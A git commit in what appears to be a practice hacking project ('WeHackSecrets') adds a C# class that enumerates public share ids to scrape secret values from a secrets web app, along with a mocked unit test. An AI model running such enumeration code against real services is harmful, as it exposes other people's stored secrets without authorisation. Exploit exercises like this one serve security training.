2200b82ef2c62d08b7d5bd38b470000e40cc0b19
Mark Taylor <mark.taylor@Betfred.com>
2017-11-27 14:17:28 +0000

    Added exploit for the public share through enumeraton.  Seed value will need to be reset in CD pipeline

---
+++ WeHackSecrets.Tests.Unit/Services/Actions/SecretShareTests.cs
@@ -0,0 +1,53 @@
+﻿using Moq;
+using System;
+using System.Collections.Generic;
+using System.Net;
+using System.Text;
+using System.Threading.Tasks;
+using WeHackSecrets.Services;
+using WeHackSecrets.Services.Actions;
+using WeHackSecrets.Services.Models;
+using Xunit;
+
+namespace WeHackSecrets.Tests.Unit.Services.Actions
+{
+    public class SecretShareTests
+    {
+        [Fact]
+        public void ConstructorFailsIfNullClient()
+        {
+            var ex = Assert.Throws<ArgumentNullException>(() =>
+                new SecretShare(null, 1)
+            );
+
+            Assert.Contains("client", ex.Message);
+        }
+
+        [Fact]
+        public void GetTargetSecret()
+        {
+            var responseContent = new StringBuilder();
+            responseContent.AppendLine("<html>");
+            responseContent.AppendLine("<body>");
+            responseContent.AppendLine("<div class=\"panel-heading\">   MySecret   </div>");
+            responseContent.AppendLine("<div class=\"panel-body\">  TEST1234   </div>");
+            responseContent.AppendLine("</body>");
+            responseContent.AppendLine("</html>");
+
+            var response = new HttpClientProxyResponse
+            {
+                StatusCode = HttpStatusCode.OK,
+                Contents = responseContent.ToString()
+            };
+
+            var client = new Mock<IHttpClientProxy>();
+            client.Setup(x => x.SendAsync(It.IsAny<HttpClientProxyRequest>()))
+                .Returns(Task.FromResult(response));
+
+            var sut = new SecretShare(client.Object, 1);
+            var result = sut.GetTargetSecret("MySecret");
+
+            Assert.Equal("TEST1234", result);
+        }
+    }
+}
---
+++ WeHackSecrets/Services/Actions/SecretShare.cs
@@ -0,0 +1,25 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading.Tasks;
+
+namespace WeHackSecrets.Services.Actions
+{
+    public class SecretShare : ISecretsList
+    {
+        private readonly SecretsListExtract _inner;
+
+        public SecretShare(IHttpClientProxy client, int id)
+        {
+            if (client == null) throw new ArgumentNullException("client");
+
+            _inner = new SecretsListExtract(client, $"Secrets/PublicShare/{id}");
+        }
+
+        public string GetTargetSecret(string secretKey)
+        {
+            return _inner.GetTargetSecret(secretKey);
+        }
+
+    }
+}
